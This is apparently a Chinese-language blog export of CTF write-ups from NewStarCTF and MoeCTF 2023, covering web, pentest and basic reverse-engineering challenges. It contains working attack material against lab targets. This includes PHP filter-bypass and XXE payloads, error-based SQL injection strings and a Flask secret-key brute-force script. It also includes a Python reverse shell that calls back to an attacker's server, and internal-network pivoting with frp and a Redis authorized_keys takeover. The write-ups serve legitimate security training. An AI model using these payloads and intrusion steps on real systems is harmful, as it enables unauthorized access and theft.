这里要求key5不是数字，但是呢key5又要大于2023\n还是数组绕过，因为科学计数法也算数字，这里有一个点：数组与数字比较，永远是数组大于数字，即使数组为空，这是PHP内部规定\nif($flag4){\recho \u0026#34;=Level 5=\u0026lt;br\u0026gt;\u0026#34;;\rextract($_POST);\rforeach($_POST as $var){\rif(preg_match(\u0026#34;/[a-zA-Z0-9]/\u0026#34;,$var)){\rdie(\u0026#34;nope,this is level 5\u0026#34;);\r}\r}\rif($flag5){\recho file_get_contents(\u0026#34;/flag\u0026#34;);\r}else{\rdie(\u0026#34;nope,this is level 5\u0026#34;);\r}\r} preg_match函数只能用于字符串的正则，遇到其他类型的会警告且不会匹配，代码将继续进行下去，然则还是数组绕过，最终payload👇\nR!C!E! #\rhint：R!C!E!\n\u0026lt;?php\rhighlight_file(__FILE__);\rif(isset($_POST[\u0026#39;password\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;e_v.a.l\u0026#39;])){\r$password=md5($_POST[\u0026#39;password\u0026#39;]);\r$code=$_POST[\u0026#39;e_v.a.l\u0026#39;];\rif(substr($password,0,6)===\u0026#34;c4d038\u0026#34;){\rif(!preg_match(\u0026#34;/flag|system|pass|cat|ls/i\u0026#34;,$code)){\reval($code);\r}\r}\r} 先用PHP把这个password的明文跑一下\n这里有一个小坑，在PHP的早期版本中，e_v.a.l中的下划线在传入的时候会被解析为双下划线，下划线可以用左中括号👉 [ 👈 来代替，他会默认被解析为下划线\n正常能看到phpinfo的内容，但是没有flag\n然后测试过后发现没有什么命令执行的函数\n这里就可以考虑另一种基于PHP的命令执行，这是部分函数👇\n可以看到当前工作目录在这里👇\n我比较喜欢的一段命令：scandir(current(localeconv()))，可以扫描出当前目录的文件，要配合print_r使用\n当前目录没东西啊，切换到根目录下看看\n因为print_r里的参数是数组，直接用索引访问，然后用show_source看源码即可\nEasyLogin #\rhint：简简单单、随心所欲\n一个简单的登陆界面，源代码能看到一些waf，密码是以MD5加密格式传入后台的\nadmin用户是已经被注册了，随便注册一个新的账号进去，可以看到是进入了chat的交互状态\n可以使用Ctrl+D的命令退出，能够执行一些简单的命令，但是没有flag，网页源码也没有什么有用的信息\n那就尝试对admin的密码进行注入\n由于密码在body里是以MD5加密的格式，所以SQL注入这里就没有办法\n在测试过程中，发现修改pw字段，会给出一些提示，这里我用python跑了一下，可以看看返回信息\n其中给出了一个弱密码的信息，可以尝试进行爆破\n因为有位数限制，所以从6位开始爆，爆出密码是000000\n进去之后还是和普通用户一样的模拟终端\n重新抓包看看响应包\n在这个页面的响应头里找到flag\nWEEK2 #\r游戏高手 #\r进去是个飞机大战的游戏\n思路和隔壁shctf是一样的，在源码里发现js文件\n只要修改gameScore变量的值就行了\n修改后让飞机坠毁，就能得到flag👇\ninclude 0。0 #\rphp源码如下👇\n\u0026lt;?php\rhighlight_file(__FILE__);\r// FLAG in the flag.php\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(isset($file) \u0026amp;\u0026amp; !preg_match(\u0026#39;/base|rot/i\u0026#39;,$file)){\r@include($file);\r}else{\rdie(\u0026#34;nope\u0026#34;);\r}\r?\u0026gt; 过滤掉了base和rot\n我们还是可以使用filter来进行读取文件，base和rot也只是两种编码形式而已，可以使用其他的编码来读取\n这里我们可以使用这个poc\n?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\r#意思是将原有的字符格式从utf8转为utf16 input伪协议在这里用不了，应该是相关设置没打开\nez_sql #\r进去随便点一个链接，发现是GET型的sql查询，而且还是单引号字符型\n使用 group by 查询得出当前有5列字段\nunion 和select 被过滤掉了，但是可通过大写绕过\n另外还有一些关键字也被过滤，也可以测试后通过部分大写绕过\nUnserialize？ #\rphp源码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\r// Maybe you need learn some knowledge about deserialize?\rclass evil {\rprivate $cmd;\rpublic function __destruct()\r{\rif(!preg_match(\u0026#34;/cat|tac|more|tail|base/i\u0026#34;, $this-\u0026gt;cmd)){\r@system($this-\u0026gt;cmd);\r}\r}\r}\r@unserialize($_POST[\u0026#39;unser\u0026#39;]);\r?\u0026gt; 过滤掉了cat、tac等命令\n不过可以使用插入斜杠来绕过，比如cat=ca\\t等\n这里生成序列化字符串的php代码👇\n\u003c?php // Maybe you need learn some knowledge about deserialize? class evil { private $cmd='ca\\\\t /th1s\\_1s\\_fffflllll4444aaaggggg'; }\r$a=new evil(); echo serialize($a);\r#O:4:\"evil\":1:{s:9:\" evil cmd\";s:35:\"less /th1s\\_1s\\_fffflllll4444aaaggggg\";}\r注意由于这里的cmd参数是private类型，生成的字符串中会存在不可见字符，要用%00将其替换\r![](./images/image-50.png)\r最终传入payload👇\r![](./images/image-51.png)\r### Upload again!\r一个文件上传页面，源码里没有东西可以看\r经过测试，php以及可以替换的后缀全部被过滤掉\r而且对文件内容有所检查，好像\u003c?php 、\u003c?这样的组合都被ban了\r但是好在可以使用另一种script方式的php代码\r```\r#这句话插在一张jpg图片的末尾\r```\r然后可以上传.htaccess文件修改系统配置\rhtaccess文件内容如下\r```\r","date":"2023-09-28","externalUrl":null,"permalink":"/posts/2023/09/newstarctf-2023/","section":"Posts","summary":"","title":"NewStarCTF-2023","type":"posts"},{"content":"\r前言 #\r好久没玩CTF了，玩玩MoeCTF，就当是温故知新\n西电的这个终端看起来好高级的样子\n之前还没用过这种，长见识了\nWEB #\rWeb入门指北 #\rDESCRIPTION: 解码获取flag\n在MoeCTF2023群里有个指北文件\n题目要解码文件里的东西\n那就来看看\n在文件的末尾有一段字符串\n浅浅看了一下，应该是一个十六进制的字符串\n拿去cyberchef解密一下\n输入：\n666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959\n6c396a61474673624756755a3055684958303d\n输出：\nflag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=\n十六进制转换之后得到的字符串仍需解密，但一眼看出Base64\nHTTP #\rDESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的\n题目给出了5个任务\n照着做就行了\n1、要有一个参数为UwU，值为u，这个是在url里\n2、用post请求发送，请求体里要有Luv=u\n3、用管理员身份，这个要抓包来修改\n4、伪造请求来源，经典的X-Forwarded-For头就能解决\n5、用Moe浏览器，修改User-Agent即可\nCookie #\rhint: readme只是一个样例，不是拿来复制的\nreadme如下\n经过测试，用户名koito和admin是已经被注册了，而且密码不是123456\n那就随便注册一个名字吧\n然后尝试获取flag（肯定是过不了的，先抓个包\n看来这个cookie是可以伪造的\n先把character改为admin\n然后token的部分，起初我以为是flask的session伪造（太久没做这种题，一下子没反应过来\n后来才发现就只是个base64加密而已\n解密之后修改一下role的值然后再加密回去就能伪造admin的身份了\n彼岸的flag #\rDESCRIPTION: 我们在某个平行宇宙中得到了一段moectf群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的flag\n送分题没意思\n在网页源码里发现flag\ngas!gas!gas! #\rDESCRIPTION: Klutton这个假期信心满满地准备把驾照拿下，于是他仔细地学习了好多漂移视频，还准备了这么一个赛博赛车场；诶，不对，开车好像不是用键盘开的？\n要求在0.5秒内反应，基本上用鼠标点是不行的（肯定不行\n那么就要写脚本了\n先随便抓个包\n可以看到在POST请求体里有相应的反应动作\n这都在网页源码里有\n先上代码👇\nimport requests\rimport re\rsession=requests.session()\rpattern=re.compile(\u0026#39;\u0026lt;font color=\u0026#34;red\u0026#34;\u0026gt;(.+)\u0026lt;/font\u0026gt;\u0026#39;)#用于提取系统反馈给我们的提示信息\rdirection=0\rthrottle=0\rfor i in range(6):\rurl=\u0026#39;http://localhost:54227/\u0026#39;\rdata={\u0026#34;driver\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;steering_control\u0026#34;:f\u0026#34;{direction}\u0026#34;,\u0026#34;throttle\u0026#34;:f\u0026#34;{throttle}\u0026#34;}\rr = session.post(url,data)\rt=re.findall(pattern,r.text)[0]\rif \u0026#34;左\u0026#34; in t:\rdirection=1\rif \u0026#34;右\u0026#34; in t:\rdirection=-1\rif \u0026#34;直\u0026#34; in t:\rdirection=0\rif \u0026#34;大\u0026#34; in t:\rthrottle=2\rif \u0026#34;小\u0026#34; in t:\rthrottle=0\rif \u0026#34;保持\u0026#34; in t:\rthrottle=1\rprint(t)\rif i\u0026gt;=5:\rprint(r.cookies) 比较简陋，但是很直观\n有点小问题就是，在pycharm中当已经完成5次的时候，打印的响应text里没有flag的信息\n就只有拿出cookie再重新发个包就能得出下图的flag了\n很简单的写一个脚本的题目\n大海捞针 #\rDESCRIPTION: 该死，之前的平行宇宙由于flag的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露flag的概率的，我们只需要连接多个平行宇宙…（难道flag在多元宇宙里是全局变量吗）\n在id不同的时候，在源代码的这段注释里的内容也有所不同\n看样子应该是在1-1000中有一个页面是有flag的\n这里我们还是不那么原始地一个一个地试了\n还是来写个脚本吧👇\nimport requests\rimport multiprocessing\rimport re\rpattern=re.compile(\u0026#34;\u0026lt;!--经过tracker，(.+)--\u0026gt;\u0026#34;)\rdef p1():\rfor i in range(1,300):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rdef p2():\rfor i in range(300,600):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rdef p3():\rfor i in range(600,1000):\rurl=f\u0026#34;http://localhost:54227/?id={i}\u0026#34;\rr=requests.get(url)\rtext=re.findall(pattern,r.text)[0]\rprint(text,i)\rif __name__==\u0026#34;__main__\u0026#34;:\rprc1=multiprocessing.Process(target=p1)\rprc2=multiprocessing.Process(target=p2)\rprc3=multiprocessing.Process(target=p3)\rprc1.start()\rprc2.start()\rprc3.start() 这里用到了一个多线程的思想，节约了一点时间（因为这个网页的响应速度太慢了。。。\n要多等一会，最终也成功找到flag\nmoe图床 #\rDESCRIPTION: 我们准备了一个moe图床用于上传一些图片\n一道文件上传的题\n在网页源码中发现，前端会对文件后缀进行修改\n上传按钮也有伴随事件\n然后我尝试修改script的内容发现也没用\n那就尝试一下先把php文件改为png，然后抓包再改回php试试\n经过测试直接改后缀是不管用的，不管是php3、4、5还是phtml\n那就尝试增加后缀吧，结果就成功了\n然后连接蚁剑，在根目录下得到flag\n了解你的座驾 #\rDESCRIPTION: 为了极致地漂移，我们准备了一个网站用于查找你喜欢的车车；听说flag也放在里面了，不过不在网站目录放在根目录应该没问题的吧。。。\n源码里没东西，先抓个包\n可以看到有xml格式的内容\n那就尝试一下XXE注入吧\n一般来说常用的XXE代码是这样的👇\n\u0026lt;?xml version=”1.0″?\u0026gt;\r\u0026lt;!DOCTYPE a[\r\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\r\u0026lt;abc\u0026gt;\u0026amp;xxe;\u0026lt;/abc\u0026gt; 但是经过测试，\u003c?xml version=”1.0″?\u003e这一行好像会报错，不过删了也没关系\n最终代码👇\n\u0026lt;!DOCTYPE a[\r\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\r\u0026lt;xml\u0026gt;\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt;\u0026lt;/xml\u0026gt; 夺命十三枪 #\rDESCRIPTION: 夺命十三枪！然后是啥来着？\n看样子应该是一道反序列化字符逃逸的问题\n看看那个包含的文件呢\n字符串替换的函数，有很多可以选择\n最终要达成Spear_Owner为MaoLei就能得到flag了\n如果正常没有替换，得到的序列化字符串就是这样\rO:34:\u0026#34;Omg_It_Is_So_Cool_Bring_Me_My_Flag\u0026#34;:2:{s:5:\u0026#34;Chant\u0026#34;;s:15:\u0026#34;夺命十三枪\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;Nobody\u0026#34;;} 从index.php那里看来，是先生成的序列化字符串，然后进行字符串替换\n意思就是Chant属性的字符串长度是不会变的\n假如chant传参di_yi_qiang\r那么得到\rO:34:\u0026#34;Omg_It_Is_So_Cool_Bring_Me_My_Flag\u0026#34;:2:{s:5:\u0026#34;Chant\u0026#34;;s:11:\u0026#34;Lovesickness\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;Nobody\u0026#34;;}\r可以看到di_yi_qiang（长度为11），而Lovesickness（长度为12），成功逃逸出一个字符 而我们要构造的目标字符串是这样的👇\n\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;MaoLei\u0026#34;;}（长度为35） 直接上Payload👇\nhttp://localhost:52707/?chant=di_er_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiangdi_si_qiang\u0026#34;;s:11:\u0026#34;Spear_Owner\u0026#34;;s:6:\u0026#34;MaoLei\u0026#34;;} meo图床 #\rDESCRIPTION: 我们准备了一个meo(?)图床用于上传一些图片\n一道表面上是文件上传的题，真的很容易被带偏😫\n经过测试，正常的图片（图片马）可以直接上传，如果是PHP文件带了GIF89a文件头也可以直接上传\n但是蚁剑是连不上的\n因为访问图片要通过另外一个 images.php 来查看\n而查看就会是这样\n抓包看效果也是直接输出文件内容，而不执行\n这里用images.php尝试去访问目标主机下的其他文件\n配合目录穿越，能看到upload.php的源码如下\n可以看到文件上传后被加了随机前缀，而且只能通过images.php来访问\n而images.php的源码如下\n可以看到是直接echo文件内容，这里是无法执行内部php代码的，坑了我好久😭\n到这里，其实这根本就不是一道文件上传题！！\n尝试在根目录下寻找flag👇，的到另一个php文件\n访问那个php文件👇\n很简单的一个MD5弱比较\n只需要MD5值为0e开头就可轻松绕过，下面是几个常用的MD5值为0e开头的\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns21587387a\nsignin #\rDESCRIPTION: 真的是signin（ **本题无需扫描器/爆破**\n题目附件里给到了源码\n默认的账号密码都是admin\n但是在源代码里可以看到几个限制条件\nusername不能是admin\n然后username不能和password相同\n那么通过了这两个就要来到hash比较\n那么这个gethash函数和hash字典的代码如下👇\n可以在本地调试一下，gethash函数的基本逻辑就是遍历字典里的键值，进行异或，admin、admin的hash值应该是‘0’，然后将原本的username和hash值一起储存到hashed_users里\n那么来到比较hash这一步，很明显在比较这里只是比较了hash值而并没有比较username\n那要做的就是把hash值变为0，因为默认的admin用户密码产生的hashed就是0\n而上面说到只有在username等于password时才能hash为0，但是数值相等的情况被ban了\n关键点就在于\n这个字符串的处理会将各种数据类型强制转换为字符串\na=\u0026#34;123\u0026#34;\rb=123\rprint(f\u0026#34;{a}{b}\u0026#34;)\rresult:123123 我们可以随便抓个包，并把params里的值进行五次base64解密可得👇\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;} 可以看到如果是这样的话，虽然hash为0，第二关我们就过不了，因为都是字符串而且数值还一样\n而上面说到gethash里的函数处理方式的问题\n那么就可以尝试构造username和password数值相同但是数据类型不一样\n比如说👇\n{\u0026#34;username\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;password\u0026#34;:123} 这在第二步比较的时候会因为username和password的类型不同而绕过\n然后把这段base64加密五次再抓包上传就能得到flag\n出去旅游的心海 #\rDESCRIPTION: 欢迎来到心海新建的博客！正值假期期间，她抓紧时间出去旅游放松一下，看看她最近都在研究什么？\nflag是打不开的，进入wordpress是一个博客\n博客页面右边有来访者信息，但是是通过页面脚本直接获得的，修改也没用\n在源代码里也有处理这些信息的脚本代码👇\n可以看到是通过一个api获得主机信息然后映射到页面，最后通过这个logger.php\n那打开logger.php看看，关键点看箭头👇\n首先time是进行了stripslashes，就是特殊字符不会被转义\n其次time在insert语句里没有被引号包裹，可以尝试注入\n最后插入失败会有报错信息\n综上，应该能想到是报错注入\n这个经过测试，ip和user_agent都是varchar类型的，传不传值都可以，time则是time字符串类型的，不符合时间类型的字符串是会报错，而且由于sql语句从左往右进行报错终止，前面报错了会导致到后面报错信息的不出现（可以本地弄个mysql尝试一下\n那么先试试吧👇可以看到爆出了数据库名\n那么尝试爆一下表呢\n会发现即使后面注入语句没有问题，time原来是字符串格式，但是有or的存在，mysql会计算两端字符串的值，time就会以double的形式被计算，所以会报错\n其实只需要把time的日期部分改成空字符串就可以了，因为在insert的时候是先判断计算这个time的语句是否合法，然后再插入，插入是后面的事情，我们在判断的时候就能看到想要的报错信息\nip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1) ##爆表名\rip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;secret_of_kokomi\u0026#39;)),1) ##爆列名\rip=\u0026amp;user_agent=\u0026amp;time=\u0026#39;\u0026#39; or updatexml(1,concat(\u0026#39;#\u0026#39;,substring((select group_concat(content)from secret_of_kokomi where id=3),1,30)),0) ##爆flag 因为有报错信息长度的限制，这里用一个substring就好了\n当然也可用sqlmap直接一把梭。。\nmoeworld #\rCHALLENGE: moeworld\nDESCRIPTION: 你已经学会了1+1=2，接下来尝试真实的渗透吧~\n解压密码为“出去旅游的心海”的flag\n先随便注册一个账号进去看到admin的留言\n很明显是要进行session伪造\n给出了部分的key，虽然后面部分是随机的，但是只有四位，是可以进行爆破的\n爆破脚本如下，自己修改cookie👇\n#!/usr/bin/env python3\r\u0026#34;\u0026#34;\u0026#34; Flask Session Cookie Decoder \u0026#34;\u0026#34;\u0026#34;\r__author__ = \u0026#39;Wilson Sumanang, Alexandre ZANNI\u0026#39;\rimport zlib\rfrom itsdangerous import base64_decode\rimport ast\rimport os\rfrom flask.sessions import SecureCookieSessionInterface\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rclass FSCM:\r@staticmethod\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\rif __name__ == \u0026#34;__main__\u0026#34;:\rcnt=1\rwhile True:\rcookie_value = \u0026#39;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFzZCJ9.ZPabPw.NC1Zaj2Hgq5v8GDo0SVtc3qC6Ek\u0026#39;\rsecret_key = \u0026#34;This-random-secretKey-you-can\u0026#39;t-get\u0026#34;+os.urandom(2).hex()\rif secret_key:\rresult = FSCM.decode(cookie_value, secret_key)\relse:\rresult = FSCM.decode(cookie_value)\rcnt+=1\rprint(result,cnt)\rif \u0026#39;power\u0026#39; in result:\rprint(result,secret_key,\u0026#39;YES\u0026#39;)\rbreak 爆破后，利用admin的session进入，看到admin留下的pin码\n进入网站下的/console，进行命令执行\n这里为了方便操作，我把shell反弹到了我自己的服务器上\nnc -lvnp port\r//打开自己服务器的端口监听\r//将下面的命令修改为自己的ip和端口，全部复制到console执行就能得到shell权限\rimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ip\u0026#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); 在根目录下找到部分flag\n$ cat /flag\rOh! You discovered the secret of my blog.\rBut I divided the flag into three sections,hahaha.\rThis is the first part of the flag\rmoectf{Information-leakage-Is-dangerous! 然后下面是reademe👇\n$ cat /readme 恭喜你通过外网渗透拿下了本台服务器的权限\r接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan\r你需要了解它的基本用法，然后扫描内网的ip段\r如果你进行了正确的操作，会得到类似下面的结果\r10.1.11.11:22 open\r10.1.23.21:8080 open\r10.1.23.23:9000 open\r将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）\r注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务\r对密码有疑问随时咨询出题人$ 要使用fscan的话首先要知道内网ip是多少\n这里要进入 /etc/hosts 进行查看存活主机\ncat /etc/hosts\r127.0.0.1 localhost\r::1 localhost ip6-localhost ip6-loopback\rfe00::0 ip6-localnet\rff00::0 ip6-mcastprefix\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r172.20.0.4 7ce8be7b3d4a\r172.21.0.3 7ce8be7b3d4a 然后进行扫描👇\n按照要求排序端口，得到密码22-3306-6379-8080\n解压hint👇\n当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果\r可以看到，在本内网下还有另外两台服务器\r其中一台开启了22(ssh)和6379(redis)端口\r另一台开启了3306(mysql)端口\r还有一台正是你访问到的留言板服务\r接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器\r此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件\r连接代理，推荐`proxychains`\r对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2\r对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3 先来做mysql服务器的部分\n在app文件夹里有个datasql的py文件，里面有连接数据库的相关信息\ndb = pymysql.connect(\rhost=\u0026#34;mysql\u0026#34;, # 数据库地址\rport=3306, # 数据库端口\ruser=\u0026#34;root\u0026#34;, # 数据库用户名\rpasswd=\u0026#34;The_P0sswOrD_Y0u_Nev3r_Kn0w\u0026#34;, # 数据库密码\rdatabase=\u0026#34;messageboard\u0026#34;, # 数据库名\rcharset=\u0026#39;utf8\u0026#39;\r) 接下来就是开启代理的步骤\n需要有一台有公网IP的服务器（就像我这个博客一样也是一个服务器），然后还要一个虚拟机kali\nfrp这个工具，可以搜一搜具体的使用方法\n在tools里存有frp的客户端的ini，只不过里面的配置无法使用\n回想起来出题人在群里提过一句写文件要到tmp目录下\n那么就应该是要我们自己到tmp目录下创建能够使用的frp配置文件\n这里靶机是客户端，那么客户端配置文件的写法比较简单\n由于vim不能使用，那就用\u0026gt;尖括号配合echo来创建文件，记得切换目录到tmp（中文是要改的部分\necho \u0026#39;[common]\\nserver_addr = 自己的公网服务器IP\\nserver_port = 稍后会用作代理的端口\\ntoken = 对接密码\\n\\n[plugin_socks5]\\ntype = tcp\\nplugin = socks5\\nremote_port = 用于连接frp的端口\\n\u0026#39; \u0026gt; frpc.ini 同时我们自己的公网服务器也要下载frp这个文件\n具体代码如下\n#安装\rwget https://github.com/fatedier/frp/releases/download/v0.38.0/frp_0.38.0_linux_amd64.tar.gz\r#解压\rtar -xzvf frp_0.38.0_linux_amd64.tar.gz 修改自己服务器的的frps.ini\n[common]\rbind_port = 用于frp的端口#这个是服务器上建立连接的端口\rtoken = 对接密码# 这个token在客户端会用到 然后执行以下命令\n在自己服务器上： ./frps -c frps.ini\r在靶机上：进入frp目录 ./frpc -c /tmp/frpc.ini 如果成功会看到这样的截图👇\n这就说明靶机和自己的服务器已经成功建立连接，自己的服务器已经处于靶机的内网环境下\n并且自己的服务器开启了socks5代理，并且可以通过这个代理访问内网其他的主机\n然后进入kali\n#进入root\rsudo su\r#然后修改proxychains的配置\rvim /etc/proxychains4.conf 如图👇\n中间用空格隔开，保存退出，然后执行以下命令\nproxychains4 mysql -uroot -pThe_P0sswOrD_Y0u_Nev3r_Kn0w -h172.20.0.3\r#选项和参数之间加空格就要自己输入密码\r#不加空格就默认后面的字符串为密码 就能成功连接mysql，找到中间部分的flag\n最后就只剩下redis的部分了\n思路：先在自己的主机上生成公私钥对，利用redis的数据备份功能，将自己的公钥写入到目标服务器的/etc/authorized_keys中，然后使用ssh的私钥直接登录目标服务器。\n首先在自己的kali上生成公私钥\nssh-keygen -t rsa\r#然后会出现几个空让你填，直接全部回车就好\r#在/root/.ssh 目录下会生成两个文件，一个是key 一个是key.pub（公钥\r#记得复制这个公钥 然后redis有个未授权访问漏洞，但是只能写文件，不能读取\n我们的目的就是要将我们自己的公钥写入redis\n在kali端执行👇\nproxychains4 redis-cli -h 172.20.0.2 进入交互，写入公钥👇\nconfig set dir /root/.ssh\rconfig set dbfilename authorized_keys\rset key \u0026#34;\\n\\n生成的公钥\\n\\n\u0026#34;\rsave\r#每条命令执行完后都应该是OK，如果错了就重来 如图所示就成功了👇\n拿到最终flag👇\n过程中保持frp的开启就行了\n艰难AK。。。。\nRE #\rbase_64 #\rDESCRIPTION: base64是一种编码方式，不过这个好像有点奇怪？\nhint:pyc文件的反编译可以试试pycdc,或者找找在线的反编译工具\n下载下来是一个pyc文件\npyc：当python程序运行时，编译的结果是保存于PyCodeObject，程序运行结束后，Python就将PyCodeObject写入到pyc文件中，这是个字节码文件。\n可以找网上的pyc反编译网址👇\n可以看到字典是被换了，用普通的base64是无法解出来的\n这里的话，可以找网上的base64代码来修改字典\n但是在网站里有更方便的方法👉CyberChef (1357310795.github.io)，就不用再写代码了\nUPX! #\rDESCRIPTION: 浮小云把自己珍藏的flag锁在UPX里了，这样应该就万无一失了吧？\n注意：可以先做xor。如果对这道题感到困难，自行搜索学习UPX是什么。\n上网搜索一下UPX的相关知识，得知文件可以进行UPX加壳，防止反编译\nupx脱壳加壳工具是一款可以专门用来进行文件脱壳和加壳的可执行程序文件压缩器，利用该软件进行脱壳和加壳处理，从而增强文件的保密性。还可以使用该软件压缩文件，减小文件的体积。\n如果不进行脱壳就直接拖进IDA，那么可见函数就会很少，（下图与本题无关\n这里配上UPX脱壳工具的链接👉：【逆向】UPX工具使用及加壳_upx.exe_江湖one Cat的博客-CSDN博客\n脱壳之后，通过字符串索引到主页面👇\n可以看到似乎就是个简单的异或解密\n这时密文的十六进制编码👇，只需逐位异或0x67u（也就是小写字母g\n这里的dup，举个例子：3 dup(\u0026lsquo;F\u0026rsquo;)=\u0026lsquo;F\u0026rsquo; \u0026lsquo;F\u0026rsquo; \u0026lsquo;F\u0026rsquo; ,就相当于是多个相同的数据的简写形式\n配上代码👇\n/*C语言代码\rUPX!!\rint main()\r{\rint a[] = { 0x0a,8,2,4,0x13,1,0x1c,\u0026#39;W\u0026#39;,0x0F,\u0026#39;8\u0026#39;,0x1e,\u0026#39;W\u0026#39;,0x12,\u0026#39;8\u0026#39;,\u0026#39;,\u0026#39;,9,\u0026#39;W\u0026#39;,0x10,\u0026#39;8\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;W\u0026#39;,0x10,\u0026#39;8\u0026#39;,0x13,8,\u0026#39;8\u0026#39;,\u0026#39;5\u0026#39;,2,0x11,\u0026#39;T\u0026#39;,0x15,0x14,2,\u0026#39;8\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;?\u0026#39;, \u0026#39;F\u0026#39;,\u0026#39;F\u0026#39;,\u0026#39;F\u0026#39;,0x1a};\rfor (int i = 0; i \u0026lt; 41; i++)\r{\rprintf(\u0026#34;%c\u0026#34;, a[i] ^ \u0026#39;g\u0026#39;);\r}\rreturn 0;\r}\r*/ Xor #\rDESCRIPTION: 这题是一个简单的异或算法。相信初学者们在熟悉了一些例如ida等工具的使用之后能很快解决。\n提示：异或有个特点，a ^ b = c ，那么c ^ a =b\n操作和上面那个UPX是一模一样的，只是不用脱壳\n这里我的IDA添加的Lazyida插件似乎在64位ida中无法使用，点了没效果，只能手抄了\n最开始我用的pycharm来跑代码，但是会跑出来不可见字符，Visualstudio则不会😑\n配上代码👇\n异或\rint main()\r{\rint a[] = {0x54,0x56,0x5C,0x5A,0x4D,0x5F,0x42,0x60,0x56,0x4C,0x66,0x52,0x57,0x9,0x4E,0x66,0x51,0x9,0x4E,0x66,0x4D,0x9,0x66,0x61,0x9,0x6B,0x18,0x44};\rchar s[28];\rfor (int i = 0; i \u0026lt; 28; i++)\r{\rs[i] = a[i] ^ \u0026#39;9\u0026#39;;\r}\rprintf(\u0026#34;%s\u0026#34;, s);\rreturn 0;\r} ANDROID #\rDESCRIPTION: 简单的android，需要一点点java基础。\n看不懂Java代码也可以问问AI？\n如果不知道一个apk文件应该怎么分析，可以试试JADX\njadx这个软件我找了半天也没找到，最后用的是另一个软件GDA\n用法也是很简单的，把apk拖进GDA然后点击一下Entry就能看到主函数了👇\n源代码👇\npublic class MainActivity extends AppCompatActivity\t// class@000f44 from classes.dex\r{\rchar[] enc;\rchar[] key;\rpublic void MainActivity(){\rsuper();\rthis.enc = new char[31]{25,7,0,14,27,3,16,\u0026#39;/\u0026#39;,24,2,9,\u0026#39;:\u0026#39;,4,1,\u0026#39;:\u0026#39;,\u0026#39;*\u0026#39;,11,29,6,7,12,9,\u0026#39;0\u0026#39;,\u0026#39;T\u0026#39;,24,\u0026#39;:\u0026#39;,28,21,27,28,16};\rthis.key = new 